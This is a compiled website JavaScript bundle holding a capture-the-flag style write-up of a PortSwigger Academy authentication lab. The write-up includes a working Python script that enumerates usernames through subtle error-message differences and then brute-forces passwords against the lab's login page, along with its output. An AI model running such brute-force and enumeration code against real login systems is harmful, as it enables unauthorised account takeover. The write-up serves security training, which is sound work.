"use strict";(self.webpackChunkwebsite=self.webpackChunkwebsite||[]).push([[1683],{3905:function(e,t,r){r.d(t,{Zo:function(){return c},kt:function(){return d}});var n=r(7294);function a(e,t,r){return t in e?Object.defineProperty(e,t,{value:r,enumerable:!0,configurable:!0,writable:!0}):e[t]=r,e}function s(e,t){var r=Object.keys(e);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(e);t&&(n=n.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),r.push.apply(r,n)}return r}function o(e){for(var t=1;t<arguments.length;t++){var r=null!=arguments[t]?arguments[t]:{};t%2?s(Object(r),!0).forEach((function(t){a(e,t,r[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(r)):s(Object(r)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(r,t))}))}return e}function i(e,t){if(null==e)return{};var r,n,a=function(e,t){if(null==e)return{};var r,n,a={},s=Object.keys(e);for(n=0;n<s.length;n++)r=s[n],t.indexOf(r)>=0||(a[r]=e[r]);return a}(e,t);if(Object.getOwnPropertySymbols){var s=Object.getOwnPropertySymbols(e);for(n=0;n<s.length;n++)r=s[n],t.indexOf(r)>=0||Object.prototype.propertyIsEnumerable.call(e,r)&&(a[r]=e[r])}return a}var u=n.createContext({}),p=function(e){var t=n.useContext(u),r=t;return e&&(r="function"==typeof e?e(t):o(o({},t),e)),r},c=function(e){var t=p(e.components);return n.createElement(u.Provider,{value:t},e.children)},l={inlineCode:"code",wrapper:function(e){var t=e.children;return n.createElement(n.Fragment,{},t)}},m=n.forwardRef((function(e,t){var r=e.components,a=e.mdxType,s=e.originalType,u=e.parentName,c=i(e,["components","mdxType","originalType","parentName"]),m=p(r),d=a,f=m["".concat(u,".").concat(d)]||m[d]||l[d]||s;return r?n.createElement(f,o(o({ref:t},c),{},{components:r})):n.createElement(f,o({ref:t},c))}));function d(e,t){var r=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var s=r.length,o=new Array(s);o[0]=m;var i={};for(var u in t)hasOwnProperty.call(t,u)&&(i[u]=t[u]);i.originalType=e,i.mdxType="string"==typeof e?e:a,o[1]=i;for(var p=2;p<s;p++)o[p]=r[p];return n.createElement.apply(null,o)}return n.createElement.apply(null,r)}m.displayName="MDXCreateElement"},1009:function(e,t,r){r.r(t),r.d(t,{frontMatter:function(){return i},contentTitle:function(){return u},metadata:function(){return p},toc:function(){return c},default:function(){return m}});var n=r(7462),a=r(3366),s=(r(7294),r(3905)),o=["components"],i={},u="Lab: Username enumeration via subtly different responses",p={unversionedId:"PortSwigger/Authentication/Lab 02",id:"PortSwigger/Authentication/Lab 02",isDocsHomePage:!1,title:"Lab: Username enumeration via subtly different responses",description:"Task",source:"@site/docs/PortSwigger/Authentication/Lab 02.md",sourceDirName:"PortSwigger/Authentication",slug:"/PortSwigger/Authentication/Lab 02",permalink:"/Writeups/docs/PortSwigger/Authentication/Lab 02",editUrl:"https://github.com/datthinh1801/Writupes/tree/main/website/docs/PortSwigger/Authentication/Lab 02.md",tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Lab: Username enumeration via different responses",permalink:"/Writeups/docs/PortSwigger/Authentication/Lab 01"},next:{title:"Lab: Username enumeration via response timing",permalink:"/Writeups/docs/PortSwigger/Authentication/Lab 03"}},c=[{value:"Task",id:"task",children:[]},{value:"Solution",id:"solution",children:[]}],l={toc:c};function m(e){var t=e.components,r=(0,a.Z)(e,o);return(0,s.kt)("wrapper",(0,n.Z)({},l,r,{components:t,mdxType:"MDXLayout"}),(0,s.kt)("h1",{id:"lab-username-enumeration-via-subtly-different-responses"},"Lab: Username enumeration via subtly different responses"),(0,s.kt)("h2",{id:"task"},"Task"),(0,s.kt)("p",null,"This lab is subtly vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:"),(0,s.kt)("p",null,(0,s.kt)("a",{parentName:"p",href:"https://portswigger.net/web-security/authentication/auth-lab-usernames"},"Candidate usernames"),(0,s.kt)("br",{parentName:"p"}),"\n",(0,s.kt)("a",{parentName:"p",href:"https://portswigger.net/web-security/authentication/auth-lab-passwords"},"Candidate passwords"),(0,s.kt)("br",{parentName:"p"}),"\n","To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page."),(0,s.kt)("h2",{id:"solution"},"Solution"),(0,s.kt)("p",null,"This lab is pretty much the same as the ",(0,s.kt)("a",{parentName:"p",href:"https://github.com/datthinh1801/Writeups/blob/main/PortSwigger/Authentication/Lab%2001.md"},"previous one"),", except for the messages returned.  "),(0,s.kt)("p",null,"In this lab, ",(0,s.kt)("inlineCode",{parentName:"p"},"Invalid username or password.")," will be returned if an invalid username is given. In case an incorrect password is given, ",(0,s.kt)("inlineCode",{parentName:"p"},"Invalid username or password")," is returned (",(0,s.kt)("em",{parentName:"p"},"note that there is no dot ",(0,s.kt)("inlineCode",{parentName:"em"},".")),").  "),(0,s.kt)("p",null,"Script:  "),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-python"},"import requests\nfrom bs4 import BeautifulSoup\nfrom concurrent.futures import ThreadPoolExecutor\n\nURL = 'https://ac0a1f3a1f3e999380b6302000c10060.web-security-academy.net/login'\n\nwith open('usernames.txt', 'r') as f:\n    usernames = f.readlines()\n\nusernames = list(map(lambda x: x.strip(), usernames))\n\nwith open('passwords.txt', 'r') as f:\n    passwords = f.readlines()\n\npasswords = list(map(lambda x: x.strip(), passwords))\n\ntrue_username = None\ntrue_password = None\n\n\ndef brute_username(username):\n    resp = requests.post(url=URL, data={'username': username, 'password': 'test'})\n    soup = BeautifulSoup(resp.text, 'html.parser')\n    if soup.find(class_='is-warning').text != 'Invalid username or password.':\n        return username\n    else:\n        return ''\n\n\ndef brute_password(password):\n    resp = requests.post(url=URL, data={'username': true_username, 'password': password})\n    soup = BeautifulSoup(resp.text, 'html.parser')\n    try:\n        warning = soup.find(class_='is-warning').text\n        return ''\n    except:\n        return password\n\n\nwith ThreadPoolExecutor(max_workers=10) as executor:\n    res = list(executor.map(brute_username, usernames))\n    true_username = ''.join(res)\n\nwith ThreadPoolExecutor(max_workers=10) as executor:\n    res = list(executor.map(brute_password, passwords))\n    true_password = ''.join(res)\n\nprint(true_username, true_password)\n")),(0,s.kt)("p",null,"Run script:"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-py"},"E:\\PortSwigger\\venv\\Scripts\\python.exe E:/PortSwigger/brute_forcer.py\noracle soccer\n")),(0,s.kt)("p",null,"Login:  "),(0,s.kt)("p",null,(0,s.kt)("img",{parentName:"p",src:"https://user-images.githubusercontent.com/44528004/130234581-d7b077fe-ac4e-44ba-9113-b7c82a7db0e9.png",alt:"image"}),"  "),(0,s.kt)("p",null,(0,s.kt)("img",{parentName:"p",src:"https://user-images.githubusercontent.com/44528004/130234624-44312a0a-598b-4211-b3c9-c1cc893cd002.png",alt:"image"})),(0,s.kt)("blockquote",null,(0,s.kt)("p",{parentName:"blockquote"},"Solved")))}m.isMDXComponent=!0}}]);